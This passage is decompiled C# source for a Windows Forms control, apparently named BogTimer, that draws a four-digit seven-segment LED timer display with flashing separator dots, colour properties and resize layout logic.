      this.ur3.ShapeColor = System.Drawing.Color.DarkGray;
      this.ur3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ur3_2 = this.ur3;
      size1 = new Size(8, 40);
      Size size27 = size1;
      ur3_2.Size = size27;
      this.ur3.TabIndex = 16;
      this.ur3.Tag = (object) "3";
      tmrShape ll3_1 = this.ll3;
      point1 = new Point(197, 65);
      Point point28 = point1;
      ll3_1.Location = point28;
      this.ll3.Name = "ll3";
      this.ll3.ShapeColor = System.Drawing.Color.DarkGray;
      this.ll3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ll3_2 = this.ll3;
      size1 = new Size(8, 40);
      Size size28 = size1;
      ll3_2.Size = size28;
      this.ll3.TabIndex = 15;
      this.ll3.Tag = (object) "3";
      tmrShape ul3_1 = this.ul3;
      point1 = new Point(197, 25);
      Point point29 = point1;
      ul3_1.Location = point29;
      this.ul3.Name = "ul3";
      this.ul3.ShapeColor = System.Drawing.Color.DarkGray;
      this.ul3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape ul3_2 = this.ul3;
      size1 = new Size(8, 40);
      Size size29 = size1;
      ul3_2.Size = size29;
      this.ul3.TabIndex = 14;
      this.ul3.Tag = (object) "3";
      tmrShape f1_1 = this.f1;
      point1 = new Point(156, 33);
      Point point30 = point1;
      f1_1.Location = point30;
      this.f1.Name = "f1";
      this.f1.ShapeColor = System.Drawing.Color.Maroon;
      this.f1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape f1_2 = this.f1;
      size1 = new Size(21, 24);
      Size size30 = size1;
      f1_2.Size = size30;
      this.f1.TabIndex = 28;
      this.f1.Tag = (object) "f1";
      tmrShape f2_1 = this.f2;
      point1 = new Point(155, 71);
      Point point31 = point1;
      f2_1.Location = point31;
      this.f2.Name = "f2";
      this.f2.ShapeColor = System.Drawing.Color.Maroon;
      this.f2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
      tmrShape f2_2 = this.f2;
      size1 = new Size(21, 24);
      Size size31 = size1;
      f2_2.Size = size31;
      this.f2.TabIndex = 29;
      this.f2.Tag = (object) "f2";
      this.BackColor = System.Drawing.Color.Black;
      this.Controls.AddRange(new Control[30]
      {
        (Control) this.f2,
        (Control) this.f1,
        (Control) this.bot4,
        (Control) this.top4,
        (Control) this.m4,
        (Control) this.lr4,
        (Control) this.ur4,
        (Control) this.ll4,
        (Control) this.ul4,
        (Control) this.bot3,
        (Control) this.top3,
        (Control) this.m3,
        (Control) this.lr3,
        (Control) this.ur3,
        (Control) this.ll3,
        (Control) this.ul3,
        (Control) this.bot2,
        (Control) this.top2,
        (Control) this.m2,
        (Control) this.lr2,
        (Control) this.ur2,
        (Control) this.ll2,
        (Control) this.ul2,
        (Control) this.bot1,
        (Control) this.top1,
        (Control) this.m1,
        (Control) this.lr1,
        (Control) this.ur1,
        (Control) this.ll1,
        (Control) this.ul1
      });
      this.Name = nameof (BogTimer);
      size1 = new Size(323, 128);
      this.Size = size1;
      this.ResumeLayout(false);
    }

    public bool EnableFlash
    {
      get => this.clsFlashEnabled;
      set => this.clsFlashEnabled = value;
    }

    private void SetFlash()
    {
      if (this.clsFlashOn)
      {
        this.f1.ShapeColor = this.clsLedOnColor;
        this.f2.ShapeColor = this.clsLedOnColor;
      }
      else
      {
        this.f1.ShapeColor = this.clsLedOffColor;
        this.f2.ShapeColor = this.clsLedOffColor;
      }
      this.clsFlashOn = !this.clsFlashOn;
      this.f1.Refresh();
      this.f2.Refresh();
    }

    private void UpdateShapes()
    {
      try
      {
        foreach (tmrShape control in this.Controls)
          control.ShapeColor = this.clsLedOffColor;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
    }

    public System.Drawing.Color LedBackColor
    {
      get => this.clsLedBackColor;
      set
      {
        this.clsLedBackColor = value;
        this.BackColor = this.clsLedBackColor;
        this.Refresh();
      }
    }

    public System.Drawing.Color LedOffColor
    {
      get => this.clsLedOffColor;
      set
      {
        this.clsLedOffColor = value;
        this.UpdateShapes();
        this.Refresh();
      }
    }

    public System.Drawing.Color LedOnColor
    {
      get => this.clsLedOnColor;
      set
      {
        this.clsLedOnColor = value;
        this.Refresh();
      }
    }

    public string TimerText
    {
      get => this.clsTimerText;
      set
      {
        int Pos = 4;
        if (StringType.StrCmp(value, "", false) == 0)
          return;
        this.clsTimerText = value;
        while (StringType.StrCmp(value, "", false) != 0)
        {
          string Chr = Strings.Mid(value, Strings.Len(value), 1);
          value = Strings.Mid(value, 1, checked (Strings.Len(value) - 1));
          this.CalculateText(Chr, Pos);
          checked { --Pos; }
        }
        if (this.clsFlashEnabled)
        {
          this.SetFlash();
        }
        else
        {
          this.f1.ShapeColor = this.clsLedOnColor;
          this.f2.ShapeColor = this.clsLedOnColor;
          this.f1.Refresh();
          this.f2.Refresh();
        }
      }
    }

    private void CalculateText(string Chr, int Pos)
    {
      tmrShape tmrShape1;
      tmrShape tmrShape2;
      tmrShape tmrShape3;
      tmrShape tmrShape4;
      tmrShape tmrShape5;
      tmrShape tmrShape6;
      tmrShape tmrShape7;
      switch (Pos)
      {
        case 1:
          tmrShape1 = this.top1;
          tmrShape2 = this.ur1;
          tmrShape3 = this.ul1;
          tmrShape4 = this.m1;
          tmrShape5 = this.lr1;
          tmrShape6 = this.ll1;
          tmrShape7 = this.bot1;
          if (StringType.StrCmp(this.top1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.top1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ur1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ur1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ul1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ul1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.m1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.m1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.lr1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.lr1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ll1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ll1.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.bot1.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
          {
            this.bot1.ShapeColor = this.clsLedOffColor;
            break;
          }
          break;
        case 2:
          tmrShape1 = this.top2;
          tmrShape2 = this.ur2;
          tmrShape3 = this.ul2;
          tmrShape4 = this.m2;
          tmrShape5 = this.lr2;
          tmrShape6 = this.ll2;
          tmrShape7 = this.bot2;
          if (StringType.StrCmp(this.top2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.top2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ur2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ur2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ul2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ul2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.m2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.m2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.lr2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.lr2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ll2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ll2.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.bot2.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
          {
            this.bot2.ShapeColor = this.clsLedOffColor;
            break;
          }
          break;
        case 3:
          tmrShape1 = this.top3;
          tmrShape2 = this.ur3;
          tmrShape3 = this.ul3;
          tmrShape4 = this.m3;
          tmrShape5 = this.lr3;
          tmrShape6 = this.ll3;
          tmrShape7 = this.bot3;
          if (StringType.StrCmp(this.top3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.top3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ur3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ur3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ul3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ul3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.m3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.m3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.lr3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.lr3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ll3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ll3.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.bot3.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
          {
            this.bot3.ShapeColor = this.clsLedOffColor;
            break;
          }
          break;
        case 4:
          tmrShape1 = this.top4;
          tmrShape2 = this.ur4;
          tmrShape3 = this.ul4;
          tmrShape4 = this.m4;
          tmrShape5 = this.lr4;
          tmrShape6 = this.ll4;
          tmrShape7 = this.bot4;
          if (StringType.StrCmp(this.top4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.top4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ur4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ur4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ul4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ul4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.m4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.m4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.lr4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.lr4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.ll4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
            this.ll4.ShapeColor = this.clsLedOffColor;
          if (StringType.StrCmp(this.bot4.ShapeColor.ToString(), this.clsLedOffColor.ToString(), false) != 0)
          {
            this.bot4.ShapeColor = this.clsLedOffColor;
            break;
          }
          break;
      }
      string sLeft = Chr;
      if (StringType.StrCmp(sLeft, StringType.FromInteger(0), false) == 0)
      {
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape6.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(1), false) == 0)
      {
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(2), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
        tmrShape6.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(3), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(4), false) == 0)
      {
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(5), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(6), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape6.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(7), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(8), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
        tmrShape6.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape7.ShapeColor = this.clsLedOnColor;
      }
      else if (StringType.StrCmp(sLeft, StringType.FromInteger(9), false) == 0)
      {
        tmrShape1.ShapeColor = this.clsLedOnColor;
        tmrShape2.ShapeColor = this.clsLedOnColor;
        tmrShape5.ShapeColor = this.clsLedOnColor;
        tmrShape3.ShapeColor = this.clsLedOnColor;
        tmrShape4.ShapeColor = this.clsLedOnColor;
      }
      tmrShape1.Refresh();
      tmrShape2.Refresh();
      tmrShape3.Refresh();
      tmrShape4.Refresh();
      tmrShape5.Refresh();
      tmrShape6.Refresh();
      tmrShape7.Refresh();
      this.f1.Refresh();
      this.f2.Refresh();
    }

    private void BogTimer_Resize(object sender, EventArgs e)
    {
      double num = 6.0;
      this.m1.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 3.0 * 0.12)));
      this.m1.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0 * 2.0 - (double) this.m1.Height / 2.0)));
      this.m1.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 8.0)));
      this.ur1.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 3.0 * 0.08)));
      this.f1.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 3.0 * 0.3)));
      this.f1.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 20.0)));
      this.f2.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 3.0 * 0.3)));
      this.f2.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 20.0)));
      try
      {
        foreach (tmrShape control in this.Controls)
        {
          if (Strings.InStr(control.Name, "f") == 0)
          {
            if (control.ShapeDirection == tmrShape.tmrShapeDirection.Vertical)
            {
              if (Strings.InStr(control.Name, "u") != 0)
                control.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0)));
              else
                control.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 2.0)));
              object tag = control.Tag;
              if (ObjectType.ObjTst(tag, (object) 1, false) == 0)
              {
                if (Strings.InStr(control.Name, "r") != 0)
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num + (double) this.m1.Width - (double) this.m1.Width / 2.0)));
                else
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num - (double) this.m1.Width / 2.0)));
              }
              else if (ObjectType.ObjTst(tag, (object) 2, false) == 0)
              {
                if (Strings.InStr(control.Name, "r") != 0)
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 2.0 + (double) this.m1.Width - (double) this.m1.Width / 2.0)));
                else
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 2.0 - (double) this.m1.Width / 2.0)));
              }
              else if (ObjectType.ObjTst(tag, (object) 3, false) == 0)
              {
                if (Strings.InStr(control.Name, "r") != 0)
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 3.0 + (double) this.m1.Width + (double) this.m1.Width / 2.0)));
                else
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 3.0 + (double) this.m1.Width / 2.0)));
              }
              else if (ObjectType.ObjTst(tag, (object) 4, false) == 0)
              {
                if (Strings.InStr(control.Name, "r") != 0)
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 4.0 + (double) this.m1.Width + (double) this.m1.Width / 2.0)));
                else
                  control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 4.0 + (double) this.m1.Width / 2.0)));
              }
              control.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0)));
              control.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 3.0 * 0.08)));
            }
            else
            {
              if (Strings.InStr(control.Name, "top") != 0)
                control.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0 - (double) control.Height / 2.0)));
              else if (Strings.InStr(control.Name, "m") != 0)
                control.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0 * 2.0 - (double) control.Height / 2.0)));
              else
                control.Top = checked ((int) Math.Round(unchecked ((double) this.Height / 4.0 * 3.0 - (double) control.Height / 2.0)));
              object tag = control.Tag;
              if (ObjectType.ObjTst(tag, (object) 1, false) == 0)
                control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num + (double) this.ur1.Width / 2.0 - (double) this.m1.Width / 2.0)));
              else if (ObjectType.ObjTst(tag, (object) 2, false) == 0)
                control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 2.0 + (double) this.ur1.Width / 2.0 - (double) this.m1.Width / 2.0)));
              else if (ObjectType.ObjTst(tag, (object) 3, false) == 0)
                control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 3.0 + (double) this.ur1.Width / 2.0 + (double) this.m1.Width / 2.0)));
              else if (ObjectType.ObjTst(tag, (object) 4, false) == 0)
                control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / num * 4.0 + (double) this.ur1.Width / 2.0 + (double) this.m1.Width / 2.0)));
              control.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 3.0 * 0.12)));
              control.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 8.0)));
            }
          }
          else
          {
            if (StringType.StrCmp(control.Name, "f1", false) == 0)
              control.Top = checked ((int) Math.Round(unchecked ((double) this.m1.Top + (double) this.m1.Height / 2.0 - (double) control.Height - (double) this.m1.Height)));
            else
              control.Top = checked ((int) Math.Round(unchecked ((double) this.m1.Top + (double) this.m1.Height / 2.0 + (double) this.m1.Height)));
            control.Left = checked ((int) Math.Round(unchecked ((double) this.Width / 2.0 - (double) control.Width / 2.0)));
            control.Height = checked ((int) Math.Round(unchecked ((double) this.Height / 3.0 * 0.3)));
            control.Width = checked ((int) Math.Round(unchecked ((double) this.Width / 20.0)));
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          ((IDisposable) enumerator).Dispose();
      }
      this.Refresh();
    }
  }
}
